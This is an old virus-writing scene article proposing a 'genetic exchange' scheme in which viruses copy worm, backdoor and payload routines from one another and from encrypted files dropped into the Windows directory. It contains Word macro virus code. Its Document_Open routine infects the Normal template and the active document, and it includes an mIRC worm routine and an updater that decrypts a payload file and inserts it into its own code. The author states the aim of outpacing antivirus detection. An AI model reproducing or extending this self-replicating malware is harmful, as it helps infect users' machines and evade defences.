Hi, i recently thought about an idea but thought it was stupid, but after
i chatted with VALLEZ on irc and co-incedently we had the same idea,
so he asked me if we could do a project together on this, so yeah 
here is the documentation about the idea, enjoy

[FOREWORD]

	Fistly, species mutate all the time, everytime a male and a female gets 
	together they give offspring to the same specie according to what specie
	they belong to. 
	
	In the biological world human cells consist out of 46 Chromosomes.
	Chromosomes are the building blocks of our DNA.
	When our parents made us, we were generated by half of our Father's chromosomes
	and half of our mother's chromosomes. Sometimes we have more of our father's 
	chromosomes than our mother's. That explains why sometimes you look more
	like your father than your mother and vica versa. 

	Sometimes we get ppl with 45 or 47 chromosomes, these ppl are ppl that have
	a certain syndrome - Downsyndome for example. Now what causes it is unknown to
	me, but i still happens today. 
	The genetic structure of the human's DNA must be 46 chromosomes in order not
	to have a syndrome. Syndromes still happen, but other types of syndromes that 
	are not linked to the genetic structure of the DNA.


[GENETICISM]
	
	My Idea is is bases on Genetic Evolution of virii. If we can code a virus with
	a certain sex then it will be possible for our virus to exchange chromosomes.
	The virus should consist out of blocks. Our virus should contain its own 
	ways of infecting files, worm routines, etc. But should make certain functions
	available for other virii to copy it from them and then use it as their own.
	
	Lets say we have two viruses on a system, the one virii's name is CATABLUR and the
	others name is PLOTUIS. PLOTIUS is our virus that seeks for genetic exchange.	
	Now when it detects CATABLUR on the system, it should look in CATABLUR
	for functions to exchange with itself. 
	If it CATABLUR supports Genetic Exchange then PLOTIUS should update itself with the 
	functions that CATABLUR has, but if CATABLUR does'nt support
	Genetic Exchange then no update will be available for PLOTIUS and PLOTIUS
	just go on with it's usual routine. 
	
	What good could happen out of this? 
 	
	Catablur = Virus from America
	Plotius =  Virus from spain
	JavCam =   Virus from South Africa

	Please note: All 3 of them supports Genetic Exchange
	
	Javcam's functions could be copied by PLOTIUS and when Catablur detects PLOTIUS
	on the system it can take the function that originated from JavCam, and so on
	
	Please note: One virus does'nt have to update the other virus, each virus is 
		     responisable for its own update.

	Here i present you a cheesy graphic:

	---------------
	-  Marker     - ; Tells info about the functions: Where, what, size, platform, etc
	---------------
	- (GES) virus - ; [GES] = Genetic Exchange Support
	---------------
	-  Functions  - ; Functions: Irc-bot, Worm, Backdoor, etc
	---------------

	Some code:
	
	'<GES>
	'Worm
	'Mirc
	'11
	
	Private sub document_Open
	........
	........
	infect normal template
	........
	........
	end sub
	
	Private sub Mirc
	with activedocument
		ret = .name
		.saveas "c:\windows\document.doc"
		.saveas ret
	end with
	open "c:\mirc\script.ini" for output as #1
		...
		mirc script
		...
	close #1
	end sub
	
	'<GES> is the marker to say it is Genetic Exchange Enabled
	'worm tells the virus it has a worm routine to share
	'mirc tells the virus that it is a mirc_worm routine
	'11 is the size of the routine 

	Another way is to export the functions to a default dir say for instance
	the windows directory. Then all our virus would have to do is find those 
	functions, and update itself with it.
	
	I suggest we use the windows registry to tell the virus where and what
	the functions are. 
	For safety we should encrypt those binary samples.
	Because the whole file gets encrypted we don't have to use a extremely
	powerfull encryption method. Lets say we use this simple method so we
	can focus on the compatiblity of all virii.

	"C:\windows\vbs.worm" = a mirc worm routine for vbs virii
	"C:\windows\asm.worm" = a mirc worm routine for Win32asm virii
	"C:\windows\mac.worm" = a mirc worm routine for macro virii

	"C:\windows\vbs.payload" = a Payload for vbs virii + the activation routine
	"C:\windows\asm.Payload" = a Payload for Win32asm virii + the activation routine
	"C:\windows\Mac.Payload" = a Payload for macro virii + the activation routine

	These are the routines a virus should look for, the virus can just decrypt it
	append it to its code and then it updated itself with some of the routines.
	
	Example
	
	* GES enabled virus but not yet updated:

	-------------------------------------------------------------------------------------
	Private sub document_open()
	call check_for_GES
	with thisdocument.vbproject.vbcomponents(1).codemodule
	mycode = .countoflines
	end with

	with normaltemplate.vbproject.vbcomponents(1).codemodule
	.deletelines 1,.countoflines
	.addfromstring mycode
	end with
	
	with activedocument.vbproject.vbcomponents(1).codemodule
	.deletelines 1,.countoflines
	.addfromstring mycode
	end with

	end sub
	
	Private sub check_for_GES()
	'Get the update

	set fso = createobject("Scripting.filesystemobject")
	set pop = fso.opentextfile("c:\windows\mac.Payload",1)
	
	'read the code
	
	KK = pop.readall
	
	'Decrypt the code
	
	for i = 1 to len(kk)
	 a = a & chr(asc(mid(kk,i,1)) xor 1)
	next
	
	'the code is now in a
	
	if len(a) = 0 then exitsub 	' if the length of the code = 0 then exit
	if len(a) > 0 then 		' but if not then update ourself with it
	with thisdocument.vbproject.vbcomponents(1).codemodule
	.insertlines .countoflines, a
	end with
	end if
	end sub

	Private sub update_payload
	end sub
	-------------------------------------------------------------------------------------
	
	* GES enabled virus updated:

	-------------------------------------------------------------------------------------
	Private sub document_open()
	call check_for_GES
	with thisdocument.vbproject.vbcomponents(1).codemodule
	mycode = .countoflines
	end with

	with normaltemplate.vbproject.vbcomponents(1).codemodule
	.deletelines 1,.countoflines
	.addfromstring mycode
	end with
	
	with activedocument.vbproject.vbcomponents(1).codemodule
	.deletelines 1,.countoflines
	.addfromstring mycode
	end with

	end sub
	
	Private sub check_for_GES()
	'Get the update

	set fso = createobject("Scripting.filesystemobject")
	set pop = fso.opentextfile("c:\windows\mac.Payload",1)
	
	'read the code
	
	KK = pop.readall
	
	'Decrypt the code
	
	for i = 1 to len(kk)
	 a = a & chr(asc(mid(kk,i,1)) xor 1)
	next
	
	'the code is now in a
	
	if len(a) = 0 then exitsub 	' if the length of the code = 0 then exit
	if len(a) > 0 then 		' but if not then update ourself with it
	with thisdocument.vbproject.vbcomponents(1).codemodule
	.insertlines .countoflines, a
	end with
	end if
	end sub
	
	Private sub update_payload
	if day(now()) = 1 then
	msgbox "I just had sex with another virus",vbinformation,"GES"
	end if
	end sub
	---------------------------------------------------------------------------------

	See it updated itself with new genetic material.

	Note: For all you cut-paste kiddies, i made this one very simple, so don't try
	      your master routine which is "THE CUT-PASTE" teq. No problem with
	      you people that writes it own teqs, the problem is  - I don't wanna
	      see this specific example in the wild, not that it has any change 
	      of going wild, but you never know.

	Back again, sorry for that, hmm, where was i..........oh, as you see
	there are much problems that can occur when writing a GES virus.

[PROBLEMS]
	
	1. Updating itself with similar code
		
		We don't want 6 million routines of mirc worms in our virii
		we only want one.
		
		Solution: Define our code propperly
			  so other virii will have enough info about the
			  piticular function	

	2. Updating itself with non-working code
		
		This problem is related to #1. The code can be working in the 
		virus we write, but will the code be working with the other
		virii? We don't know.

		Solution: We vxers should make like a typical standard
			  in which we code it. 
			  Our functions should be able to work on its 
			  own. I think this might help this be more compatible
			  
	3. The virus size grows too big.
		
		2 gig virus sounds too big don't you think?
		
		Solution #1 : When the virus reach a certain size then we should
			      delete a function or 2, but then you end up
			      being a virus that was already there if you deleted
			      all the functions.
	
		Solution #2 : Don't Add more functions, but replace these functions 
			      with other functions. That way we can still update
	
	I like the 2nd method, coz lets say the virii that provides the other with
	functions gets detected by AV, then that functions goes with the virus, but
	when he exports its functions then other virii can still update themself with
	the functions. 
	
	We can compare this to the biological world:
		
	When a virus takes code directly from the other virus it is the same
	as when a male and female has sex.
	When a virus exports his code we can compare it to a sperm bank.
	The virus exports its "sperm" to the drive and there it stays 
	till it gets deleted or corrupted.


[CONCLUSION] 
		
	It might look like and stupid idea, because of the complexity, but the more
	vxers write Genetic Exchange enabled viruses the more updates we have
	viruses don't have to rely on the vxer to make a very complex virus, but the 
	virus relies on other virii or exported functions of other virii.
	
	In the end a virus can get so complex, that AV will have to make a new
	teq to detect our virii samples
